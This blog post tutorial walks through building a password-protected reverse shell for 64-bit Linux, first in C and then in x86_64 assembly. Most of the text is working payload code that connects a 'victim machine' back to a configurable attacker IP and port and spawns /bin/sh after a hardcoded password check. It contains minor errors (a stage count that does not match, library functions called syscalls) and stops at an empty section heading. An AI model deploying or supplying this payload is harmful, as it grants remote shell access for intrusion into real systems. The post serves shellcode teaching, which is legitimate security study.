---
title: "Implementing a password protected reverse shell in shellcode"
categories:
  - blog
---

The goal of the following blog post is to write shellcode for the Linux 64-bit architecture that will ultimately connect back to a remote machine and spawn a shell as well as requiring a password before any commands can be run inside the shell.

This blog post will follow a similar process to the bind shell process, but should be a little shorter seeing as a reverse shell is a little easier to implement in C, and Assembly, and because you should now be a little more familiar with most of the concepts.

We will step through the process again following the same framework:

<ol>
  <li>Firstly, we need to write the code, in the C Programming Language, for creating a socket and then connecting to a remote machine and password protecting it.</li>
  <li>Secondly, the C code needs to be ported to Linux x86_64 Assembly code.</li>
  <li>Lastly, all Null bytes need to be removed from the Assembly code and we need to look for opportunities to optimize our shellcode to keep the final payload as small as possible.</li>
</ol>

<h2>Writing a password protected reverse shell for Linux in C</h2>

<h3>What is a reverse shell?</h3>

A reverse shell is when a victim machine initiates a connection back to the attacker controller machine and spawns a shell upon connection. The reason we would want to use a reverse shell rather than a bind shell is usually to get past a firewall, that do not allow incoming connections, or a NAT solution. If we were to leave our compiled reverse shell lying around on a server that we tested for instance, then anybody would be able to use it. That is if the compiled binary accepts arguments, which ours does not in this case, but it should illustrate the point. In such a case, we hardcode the password so at least they will need to reverse engineer the binary, to find the password, before they can execute commands on the connect-back.

<h3>Creating the reverse shell</h3>

In the process of creating a bind shell, we will be stepping through 7 stages:

<ol>
  <li>Creating a new socket</li>
  <li>Initiate the connection back to remote server</li>
  <li>Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities.</li>
  <li>Wait for input (password) to be received and compare it against the correct password string</li>
  <li>Spawn the shell, if password is correct</li>
</ol>

Let's get started in coding out the reverse shell

<h3>Stage 1 - Creating a new socket</h3>

We will use the same skeleton program as before and import all our libraries and declare all variables:

```c
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<string.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>


int main()
{
        struct sockaddr_in server;
        int sock;
        int sockaddr_len = sizeof(struct sockaddr_in);
        char *arguments[] = { "/bin/sh", 0, "4444", "127.0.0.1", "YOLOOOOOOO" };
        char buf[16];

}
```

Creating the socket is handled by the [socket](https://man7.org/linux/man-pages/man2/socket.2.html) syscall.

Referring to the man page for socket, it requires 3 arguments:

<ul>
    <li>Protocol Family - We will be using AF_INET (IPv4 Internet Protocols)</li>
    <li>Communication Type - We will use SOCK_STREAM (TCP)</li>
    <li>The third argument does not concern us so we will only pass 0</li>
</ul>

```c
sock = socket(AF_INET, SOCK_STREAM, 0);
```

The return value for the above syscall will be a file descriptor for the new socket.

<h3>Stage 2 - Initiate the connection back to remote server</h3>

In this step we will construct our 'sockaddr' data structure and actually connect to our remote machine using the [connect](https://man7.org/linux/man-pages/man2/connect.2.html) syscall. Note that in this instance we will be using the localhost IP, but this can be changed to your remote IP Address.

The connect syscall takes 3 arguments:

<ul>
    <li>The socket to bind to - We will use our new socket "sock".</li>
    <li>Data structure of the remote attacker machine, which is essentially the IP Address and port that that will be bound to the socket. This data structure consists of 4 members that are each explained below.</li>
    <li>Length of the data structure passed in argument 2. This was declared during the skeleton code stage.</li>
</ul>

```c
server.sin_family = AF_INET; //Address Family
server.sin_port = htons(atoi(arguments[2])); //Network Byte order of the port to bind to. 
                                             //htons converts host byte order to network byte order
server.sin_addr.s_addr = inet_addr(arguments[3]); //Our remote IP Address defined in the variables (in this case localhost)
bzero(&server.sin_zero, 8); // 8 zero bytes of padding

connect(sock, (struct sockaddr *)&server, sockaddr_len);
```

<h3>Stage 3 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>

For this stage we will be duplicating the file descriptor of our newly created socket and provide it with the basic shell capabilities. The [dup2](https://man7.org/linux/man-pages/man2/dup.2.html) syscall will do nicely for this purpose. We need to provide the file descriptor of our newly created socket and the integer assigned to STDIN (0), STDOUT (1) and STDERROR(2) to dup2.

```c
dup2(sock, 0);
dup2(sock, 1);
dup2(sock, 2);
```

<h3>Stage 4 - Wait for input (password) to be received and compare it against the correct password string</h3>

Now that we have remote shell capabilities on our socket, let's wait for input (password) from the connection and compare it to the password that we have in memory. We will wait for and read input with the [read](https://man7.org/linux/man-pages/man2/read.2.html) syscall.

The read syscall accepts 3 arguments:

<ul>
<li>File descriptor of our newly created socket</li>
<li>Buffer - was assigned at the variables section of the code</li>
<li>Number of bytes to read from the file descriptor into the buffer</li>
</ul>

We will then use the [strcspn](https://man7.org/linux/man-pages/man3/strcspn.3.html) syscall to calculate the number of bytes in the buffer and using the [strcmp](https://man7.org/linux/man-pages/man3/strcmp.3.html) syscall to compare the string in the buffer with our hardcoded password in memory. If the two strings match, the strcmp syscall will return a 0, and our program will continue. If the two strings don't match, our program/shell will exit.

```c
read(sock, buf, 16);
buf[strcspn(buf, "\n")] = 0;
if (strcmp(arguments[4], buf) == 0)
{        
      execve(arguments[0], &arguments[0], NULL);
}
       
```

<h3>Stage 5 - Spawn the shell, if password is correct</h3>

So, if we have provided the correct password, our program/shell will continue and actually spawn our shell using the [execve](https://man7.org/linux/man-pages/man2/execve.2.html) syscall with the arguments that were configured in the variables section.

The execve syscall executes a program using:

<ul>
  <li>Pathname of the executable or script to run</li>
  <li>A pointer to the filename/executable and arguments passed to the executable. We do not have any arguments in this case, so just the pointer to our executable</li>
  <li>Environmental variables for use by the program - We set this to NULL as we are not concerned with this</li>
</ul>

All we need to do now is compile the C code into an elf binary and execute it. Hopefully, if we have done everything right, we will be presented with a shell upon connection back to our remote IP.

The code for the password protected reverse shell can be found [here](https://github.com/J33R4FF3/Pass_Rev_Shell).

<h2>Writing a password protected reverse shell in 64-bit Assembly</h2>

If you have not, by now, read the blogpost [here](https://j33r4ff3.github.io/blog/Creating-TCP-Bind-Shell-with-C_2/), I would encourage you to do so as it covers most of the Assembly concepts needed to understand this part of the process.

Ok, so if you have started reading this then I assume syscalls, registers and The Stack already makes sense to you and we can carry on coding our reverse shell in Assembly. As you might have noticed, the reverse shell has fewer stages and fewer syscalls as well as one new syscall. Let's map out the syscall we will be using in Assembly:

```nasm
read == 0
socket == 41
connect == 42
dup2 == 33
execve == 59
exit == 60
```

That is about all we require to start with our Assembly code, so let's put our skeleton program in place before we carry on.


```nasm
global _start

section .text

_start:

exit:
```

<h3>Stage 1 - Creating a socket</h3>

```c
sock = socket(AF_INET, SOCK_STREAM, 0);
```

Remember that we can use Python to easily find out the values, for AF_INET & SOCK_STREAM, that we need to pass in Assembly. Recall that the value for AF_INET needs to be 2 and the value for SOCK_STREAM needs to be 1. So let’s put together our first block of assembly code.

```nasm
mov rax, 41 ;Syscall number for socket
mov rdi, 2 ;Value for AF_INET
mov rsi, 1 ;Value for SOCK_STREAM
mov rdx, 0 ;Third argument where we need to pass a 0
syscall //Give the syscall instruction
```

Again, if the block of code above makes no sense to you then go and read the previous blogposts first.

<h3>Initiate the connection back to remote server</h3>

```c
server.sin_family = AF_INET; //Address Family
server.sin_port = htons(atoi(arguments[2])); //Network Byte order of the port to bind to. 
                                             //htons converts host byte order to network byte order
server.sin_addr.s_addr = inet_addr(arguments[3]); //Our remote IP Address defined in the variables (in this case localhost)
bzero(&server.sin_zero, 8); // 8 zero bytes of padding

connect(sock, (struct sockaddr *)&server, sockaddr_len);
```

```nasm

        mov rdi, rax

        xor rax, rax

        push rax
        
        mov dword [rsp-4], 0x7f000001
        mov word [rsp-6], 0x5c11
        mov word [rsp-8], 0x2
        sub rsp, 8
        
        mov rax, 42
        mov rsi, rsp
        mov rdx, 16
        syscall
        
```

```nasm

        mov rax, 33
        mov rsi, 0
        syscall

        mov rax, 33
        mov rsi, 1
        syscall

        mov rax, 33
        mov rsi, 2
        syscall

        xor rax, rax

        push r10
        mov rsi, rsp
        
        xor rdx, rdx
        mov rdx, 8
        syscall

        xor rax, rax
        ; password '8bytesss'
        mov rax, 0x7373736574796238
        mov rdi, rsi
        scasq
        jne exit

        xor rax, rax
        push rax

        mov rbx, 0x68732f2f6e69622f
        push rbx

        mov rdi, rsp

        push rax

        mov rdx, rsp

        push rdi
        mov rsi, rsp
        mov rax, 59
        syscall

        xor rax, rax
        mov rax, 60
        syscall
```

<h2>Removing null bytes from generated shellcode</h2>
